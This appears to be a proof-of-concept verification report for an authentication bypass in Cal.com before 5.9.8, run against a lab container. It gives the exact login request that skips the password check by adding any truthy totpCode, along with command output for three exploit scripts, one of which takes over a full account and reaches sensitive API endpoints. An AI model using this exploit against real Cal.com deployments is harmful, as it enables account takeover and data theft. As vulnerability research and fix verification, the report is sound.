# PoC Verification Report: CVE-2025-66489

## Verification Status: ✅ CONFIRMED

The authentication bypass vulnerability in Cal.com < 5.9.8 has been **fully verified** across three independent attack vectors. The exploit reliably bypasses password verification by injecting any truthy value into the `totpCode` field during credential-based login.

## CVE Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-66489 |
| **Title** | Cal.com Authentication Bypass via TOTP Code Injection |
| **CVSS** | 9.8 (Critical) |
| **Affected** | Cal.com < 5.9.8 |
| **CWE** | CWE-303 (Incorrect Implementation of Authentication Algorithm) |
| **Verified Against** | Cal.com v5.9.7 (commit `8167fe0d05`) |

## PoC Scripts

| Script | Path | Description | Result |
|--------|------|-------------|--------|
| **poc.py** (Primary) | `poc/poc.py` | Full exploit with baseline comparison and session verification | ✅ CONFIRMED |
| **poc_vector2_minimal_totp.py** | `poc/poc_vector2_minimal_totp.py` | Tests 6 edge-case totpCode values + negative control | ✅ CONFIRMED (6/6 bypass, negative control passed) |
| **poc_vector3_session_hijack.py** | `poc/poc_vector3_session_hijack.py` | Full account takeover: bypass → access 6 sensitive API endpoints | ✅ CONFIRMED (6/6 endpoints accessible) |

All scripts are self-contained Python 3 using only stdlib (`urllib`, `json`, `sys`). No external dependencies required.

## Vulnerability Demonstrated

The PoC proves that an attacker can **fully bypass password verification** for any Cal.com user (without 2FA enabled) by simply including a `totpCode` field with any truthy value in the login request.

**Root cause**: In `packages/features/auth/lib/next-auth-options.ts` line 179:
```typescript
if (user.password?.hash && !credentials.totpCode) {
    // Password verification ONLY happens here
}
```

When `credentials.totpCode` is truthy, `!credentials.totpCode` evaluates to `false`, the entire password verification block is skipped, and for non-2FA users the code falls through to a successful authentication.

## Test Environment

| Component | Details |
|-----------|---------|
| **Vulnerable Container** | `cve-2025-66489-vulnerable` (Cal.com v5.9.7) |
| **Container IP** | `172.19.0.4` (lab-net network) |
| **Port** | 3000 (HTTP) |
| **Database** | `cve-2025-66489-db` (PostgreSQL 15) |
| **Test User** | `victim@example.com` / `Password123!` (2FA disabled) |
| **Vulnerable Endpoint** | `POST /api/auth/callback/credentials` |

## Vector 1: Primary Authentication Bypass (poc.py)

### Command
```bash
cd poc
python3 poc.py 172.19.0.4 3000 victim@example.com
```

### Output
```
╔══════════════════════════════════════════════════════════╗
║  CVE-2025-66489 — Cal.com Auth Bypass via TOTP Injection ║
║  Cal.com < 5.9.8 | CVSS 9.8 Critical                    ║
╚══════════════════════════════════════════════════════════╝

Target: http://172.19.0.4:3000
Victim: victim@example.com
[*] Step 1: Fetching CSRF token from http://172.19.0.4:3000/api/auth/csrf
[+] CSRF token obtained: 4f2b0e0744f1cf11ab86...

============================================================
  BASELINE TEST: Wrong password WITHOUT totpCode
============================================================

[*] Step 2: Attempting login — NORMAL (without totpCode)
    Email:    victim@example.com
    Password: ThisIsDefinitelyNotThePassword123!
    HTTP Status:  401
    Location:     
    Session Token: (none)

[+] Baseline confirmed: wrong password correctly rejected
[*] Step 1: Fetching CSRF token from http://172.19.0.4:3000/api/auth/csrf
[+] CSRF token obtained: 3cad8634aa2bde205527...

============================================================
  EXPLOIT: Wrong password WITH totpCode=000000
============================================================

[*] Step 3: Attempting login — BYPASS (with totpCode)
    Email:    victim@example.com
    Password: ThisIsDefinitelyNotThePassword123!
    totpCode: 000000 (triggers password bypass)
    HTTP Status:  200
    Location:     
    Session Token: eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0....

[+] EXPLOIT SUCCEEDED: Password verification was BYPASSED!

[*] Step 4: Verifying session validity
[+] Session is VALID — authenticated as:
    Name:  Victim User
    Email: victim@example.com
    ID:    2
    Role:  USER

============================================================
  RESULTS SUMMARY
============================================================
  Normal login (wrong password, no totpCode): FAILED (correct)
  Bypass login (wrong password + totpCode):   SUCCEEDED ✓
  Session valid:                              YES ✓

  ✅ CVE-2025-66489 CONFIRMED — Authentication bypass demonstrated
  The attacker gained access to victim@example.com's account
  without knowing the correct password.
```

### Analysis

The PoC performs a controlled comparison:
1. **Baseline**: Login with wrong password, no `totpCode` → **Correctly rejected (HTTP 401)** — proves authentication works normally
2. **Exploit**: Login with wrong password + `totpCode=000000` → **Succeeds (HTTP 200, session token returned)** — proves the bypass
3. **Session verification**: The stolen session cookie grants full access to the victim's account data

The **only difference** between the two requests is the presence of `totpCode=000000`. This isolates the vulnerability precisely.

## Vector 2: Minimal totpCode Edge Cases (poc_vector2_minimal_totp.py)

### Command
```bash
python3 poc_vector2_minimal_totp.py 172.19.0.4 3000 victim@example.com
```

### Output
```
╔══════════════════════════════════════════════════════════════╗
║  CVE-2025-66489 — Vector 2: Minimal totpCode Values        ║
║  Testing edge-case totpCode values for bypass               ║
╚══════════════════════════════════════════════════════════════╝

Target: http://172.19.0.4:3000
Victim: victim@example.com
Password used: CompletelyWrongPassword! (deliberately wrong)

  totpCode='x'          (single character              ) → BYPASS ✓  [HTTP 200]
  totpCode='0'          (string zero (truthy in JS)    ) → BYPASS ✓  [HTTP 200]
  totpCode='false'      (string 'false' (truthy in JS) ) → BYPASS ✓  [HTTP 200]
  totpCode=' '          (single space character        ) → BYPASS ✓  [HTTP 200]
  totpCode='999999'     (invalid 6-digit TOTP          ) → BYPASS ✓  [HTTP 200]
  totpCode='a]b[c'      (special characters            ) → BYPASS ✓  [HTTP 200]

  Negative controls (should NOT bypass):
  totpCode=''           (empty string (falsy in JS)    ) → BLOCKED ✓  [HTTP 401]

============================================================
  RESULTS: 6/6 edge-case values triggered bypass
  Empty string correctly blocked (negative control passed)

  ✅ CONFIRMED: ANY truthy totpCode value bypasses password check
```

### Analysis

This vector confirms that the bypass is caused by JavaScript's truthy/falsy semantics in the `!credentials.totpCode` check:
- **All truthy values bypass**: Single char `"x"`, string `"0"`, `"false"`, space `" "`, invalid TOTP `"999999"`, special chars — all work
- **Empty string blocked**: `""` is falsy in JS, so `!credentials.totpCode` evaluates to `true`, and password verification correctly executes
- **Conclusion**: The vulnerability is **not** in TOTP validation — the code never reaches TOTP validation for non-2FA users. The bypass is purely in the conditional logic gating password verification.

## Vector 3: Full Account Takeover (poc_vector3_session_hijack.py)

### Command
```bash
python3 poc_vector3_session_hijack.py 172.19.0.4 3000 victim@example.com
```

### Output
```
╔══════════════════════════════════════════════════════════════╗
║  CVE-2025-66489 — Vector 3: Full Account Takeover Demo     ║
║  Bypass auth → Access sensitive endpoints → Steal data      ║
╚══════════════════════════════════════════════════════════════╝

Target: http://172.19.0.4:3000
Victim: victim@example.com

[*] Phase 1: Authentication Bypass
[+] Got session cookie: next-auth.session-token=eyJhbGciOiJkaXIiLCJlbmMiOi...

[*] Phase 2: Accessing Sensitive Endpoints

  [2a] Session Info (/api/auth/session):
  ✓ Status 200 — Authenticated as:
    Name:  Victim User
    Email: victim@example.com
    ID:    2
    Role:  USER

  [2b] User Profile (tRPC me/get):
  ✓ Status 200 — Full profile data stolen:
    username: victim
    email: victim@example.com
    name: Victim User
    bio: None
    timeZone: America/New_York
    locale: en
    theme: None
    identityProvider: CAL
    twoFactorEnabled: False
    completedOnboarding: True

  [2c] Event Types (tRPC eventTypes/getByViewer):
  ✓ Status 200 — Event types accessible
    Event type groups: 1

  [2d] Bookings (tRPC bookings/get):
  ✓ Status 200 — Bookings endpoint accessible

  [2e] Availability (tRPC availability/list):
  ✓ Status 200 — Availability data accessible
    Schedules: 0

  [2f] API Keys (tRPC apiKeys/list):
  ✓ Status 200 — API keys endpoint accessible (can create/steal API keys)

============================================================
  ACCOUNT TAKEOVER RESULTS
============================================================
  Authentication bypass: SUCCESS
  Endpoints tested:      6
  Endpoints accessible:  6/6
  Access level:          Full authenticated user session

  ✅ FULL ACCOUNT TAKEOVER CONFIRMED
  Attacker can access victim's calendar, bookings, profile,
  event types, and all authenticated endpoints.
```

### Analysis

This vector demonstrates the **full impact** of the authentication bypass:
1. **Authentication bypass**: Single HTTP POST with `totpCode=000000` obtains a valid session token
2. **Complete API access**: All 6 tested tRPC endpoints are accessible with the stolen session:
   - `/api/auth/session` — User identity and role
   - `/api/trpc/me/get` — Full profile data (email, timezone, identity provider, 2FA status)
   - `/api/trpc/eventTypes/getByViewer` — Scheduling configuration
   - `/api/trpc/bookings/get` — Calendar bookings
   - `/api/trpc/availability/list` — Availability schedules
   - `/api/trpc/apiKeys/list` — API key management (could create persistent access)
3. **Impact**: Full account takeover — attacker has the same access level as the victim

## Exploit Flow (Step-by-Step)

```
1. GET  /api/auth/csrf
   → Response: {"csrfToken": "<token>"}
   Purpose: Obtain CSRF token required for NextAuth credential submission

2. POST /api/auth/callback/credentials
   Content-Type: application/x-www-form-urlencoded
   Body: email=victim@example.com&password=ANYTHING&totpCode=000000&csrfToken=<token>&json=true

   What happens server-side:
   a) User lookup by email → finds victim user ✓
   b) Check user locked → not locked ✓
   c) Rate limit check → passes ✓
   d) Line 172: !user.password?.hash → false (user has password) → skip
   e) Line 175: !user.password?.hash → false → skip
   f) Line 179: user.password?.hash && !credentials.totpCode
      → true && !("000000") → true && false → FALSE
      → ENTIRE PASSWORD CHECK BLOCK SKIPPED ← VULNERABILITY
   g) Line 189: user.twoFactorEnabled → false → skip 2FA check
   h) Line 260+: Return user object → Authentication SUCCEEDS

   → Response: HTTP 200 with Set-Cookie: next-auth.session-token=<jwt>

3. GET  /api/auth/session (with session cookie)
   → Response: {"user": {"name": "Victim User", "email": "victim@example.com", ...}}
   Purpose: Confirm full account access
```

## Prerequisites for Exploitation

| Requirement | Detail |
|-------------|--------|
| **Valid email** | Attacker must know a registered user's email address |
| **CSRF token** | Obtained from unauthenticated `GET /api/auth/csrf` |
| **Non-2FA target** | Target user must NOT have 2FA enabled (most users) |
| **Network access** | HTTP(S) access to the Cal.com instance |
| **Authentication** | None required — fully pre-authentication exploit |

## Notes and Observations

1. **Reliability**: The exploit is 100% reliable across all test runs. The vulnerability is a deterministic logic flaw with no timing or race condition dependencies.

2. **Stealth**: The exploit generates minimal server-side logging. The login appears as a normal successful authentication — there is no failed password log entry because the password is never checked.

3. **No existing public exploits**: No PoCs were found in ExploitDB, Metasploit, GitHub, or Nuclei templates. This is a first-of-kind PoC.

4. **Fix verification**: The fix (commit `63d1361a7a`) removes all `totpCode` conditions from the password verification path, making password verification unconditional. The same exploit request would be rejected on v5.9.8+.

5. **2FA users are partially protected**: Users with `twoFactorEnabled: true` still have their password factor bypassed, but the attacker would need a valid 6-digit TOTP code to complete authentication. This degrades 2FA to single-factor auth.

6. **Session token format**: NextAuth uses JWE (JSON Web Encryption) with `A256GCM` encryption for session tokens. The tokens are opaque and encrypted with `NEXTAUTH_SECRET`. They cannot be forged without the secret, but the exploit obtains legitimate tokens via the bypass.
